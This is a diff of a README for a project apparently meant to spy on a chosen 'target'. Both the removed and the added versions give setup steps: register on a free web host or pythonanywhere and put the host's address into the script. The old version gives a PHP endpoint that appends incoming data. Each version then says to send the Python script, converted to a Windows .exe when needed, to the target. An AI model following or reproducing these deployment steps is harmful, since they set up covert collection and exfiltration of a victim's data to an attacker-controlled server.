@@ -1,7 +1,4 @@
 # RandomProject
-1. Goto https://www.000webhost.com/ and create a website with unique name.
-2. Under your website, goto file manager and public html, inside that folder, upload web.php and database.txt file.
-3. In the .py file, change the name with <"your_website_name.000webhoshapp.com/web.php?action=append&data="+newdata>.
-4. Send this .py file to your target.
-
-*Note :* If your target does not have python installed, you first need to convert the .py file to .exe file (for Windows).
+1. Goto http://rajma.pythonanywhere.com/ and register.
+2. Add your username in the .py file
+*Note :* If your target does not have python installed, you first need to convert the .py file to .exe file (for Windows) using suitable tools like pyinstaller.
